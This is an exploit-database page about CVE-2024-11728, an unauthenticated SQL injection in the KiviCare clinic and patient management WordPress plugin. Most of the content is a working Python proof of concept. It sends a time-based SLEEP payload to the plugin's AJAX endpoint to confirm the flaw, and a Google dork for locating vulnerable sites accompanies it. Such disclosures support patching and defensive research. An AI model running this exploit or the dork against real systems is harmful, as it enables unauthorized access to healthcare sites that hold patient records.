---
title: KiviCare Clinic & Patient Management System 3.6.4 Unauthenticated SQL Injection
url: https://cxsecurity.com/issue/WLB-2025040038
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-25
fetch_date: 2025-10-06T22:03:26.187514
---

# KiviCare Clinic & Patient Management System 3.6.4 Unauthenticated SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **KiviCare Clinic & Patient Management System 3.6.4 Unauthenticated SQL Injection** **2025.04.24**  Credit:  **[Gözet](https://cxsecurity.com/author/%2BG%C3%B6zet/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-11728](https://cxsecurity.com/cveshow/CVE-2024-11728/ "Click to see CVE-2024-11728")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")**  **[**Dork:** inurl:"/wp-content/plugins/kivicare-clinic-management-system/](https://cxsecurity.com/dorks/)** | |

# Exploit Title: KiviCare Clinic & Patient Management System (EHR) 3.6.4 - Unauthenticated SQL Injection
SQL Injection
# Google Dork: inurl:"/wp-content/plugins/kivicare-clinic-management-system/
# Date: 11/12/2024
# Exploit Author: Samet "samogod" Gözet
# Vendor Homepage: wordpress.org
# Software Link:
https://wordpress.org/plugins/kivicare-clinic-management-system/
# Version: < 3.6.5
# Tested on: Ubuntu 22.04
# CVE : CVE-2024-11728
#!/usr/bin/env python3
"""
CVE-2024-11728 - KiviCare WordPress Plugin Unauthenticated SQL Injection PoC
Author: samogod.samet.g
Description:
Proof of Concept for Unauthenticated SQL Injection vulnerability
in KiviCare WordPress Plugin <= 3.6.4.
The vulnerability exists in the tax\_calculated\_data AJAX action
where the visit\_type[service\_id]
parameter is insufficiently escaped, allowing SQL injection attacks.
Usage:
python3 CVE-2024-11728.py -u <target\_url> [-t <timeout>] [-v]
"""
import argparse
import requests
import sys
import time
from urllib3.exceptions import InsecureRequestWarning
# Disable SSL warnings
requests.packages.urllib3.disable\_warnings(category=InsecureRequestWarning)
class KiviCareExploit:
def \_\_init\_\_(self, url, timeout=10, verbose=False):
self.url = url.rstrip('/')
self.timeout = timeout
self.verbose = verbose
self.target = f"{self.url}/wp-admin/admin-ajax.php"
self.headers = {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept': '\*/\*'
}
def log(self, message, level="info"):
"""Custom logging function"""
colors = {
"info": "\033[94m[\*]",
"success": "\033[92m[+]",
"error": "\033[91m[-]",
"warning": "\033[93m[!]"
}
print(f"{colors.get(level, '[\*]')} {message}\033[0m")
def verify\_vulnerability(self):
"""Verify if the target is vulnerable using a time-based SQL
injection"""
self.log("Testing vulnerability with time-based SQL injection...")
data = {
'action': 'ajax\_post',
'route\_name': 'tax\_calculated\_data',
'clinic\_id[id]': '1',
'doctor\_id[id]': '1',
'visit\_type[0][service\_id]': "123) AND (SELECT \* FROM
(SELECT(SLEEP(5)))alias) AND (1=1",
'\_ajax\_nonce': '5d77fc94cf' # You need to update this nonce value
}
try:
normal\_data = {
'action': 'ajax\_post',
'route\_name': 'tax\_calculated\_data',
'clinic\_id[id]': '1',
'doctor\_id[id]': '1',
'visit\_type[0][service\_id]': "1",
'\_ajax\_nonce': '5d77fc94cf' # You need to update this
nonce value
}
start\_time = time.time()
normal\_response = requests.post(
self.target,
data=normal\_data,
headers=self.headers,
verify=False,
timeout=self.timeout
)
normal\_time = time.time() - start\_time
if self.verbose:
self.log(f"Normal request time: {normal\_time:.2f}
seconds", "info")
self.log(f"Normal response: {normal\_response.text}", "info")
start\_time = time.time()
try:
response = requests.post(
self.target,
data=data,
headers=self.headers,
verify=False,
timeout=self.timeout
)
elapsed\_time = time.time() - start\_time
if self.verbose:
self.log(f"Injection request time:
{elapsed\_time:.2f} seconds", "info")
self.log(f"Request data: {data}", "info")
if elapsed\_time >= 4.5:
self.log("Target appears to be vulnerable!", "success")
return True
else:
self.log("Target does not appear to be
vulnerable.", "warning")
return False
except requests.exceptions.Timeout:
self.log("Request timed out - target is vulnerable!", "success")
return True
except requests.exceptions.RequestException as e:
self.log(f"Error during vulnerability check: {str(e)}", "error")
return False
def main():
parser = argparse.ArgumentParser(description='KiviCare WordPress
Plugin Unauthenticated SQL Injection PoC (CVE-2024-11728)')
parser.add\_argument('-u', '--url', required=True, help='Target URL
(e.g., http://example.com)')
parser.add\_argument('-t', '--timeout', type=int, default=10,
help='Request timeout in seconds')
parser.add\_argument('-v', '--verbose', action='store\_true',
help='Enable verbose output')
args = parser.parse\_args()
print("""
CVE-2024-11728 - KiviCare WordPress Plugin Unauthenticated SQL Injection
Author: samogod.samet.g
""")
exploit = KiviCareExploit(args.url, args.timeout, args.verbose)
exploit.verify\_vulnerability()
if \_\_name\_\_ == '\_\_main\_\_':
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025040038)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top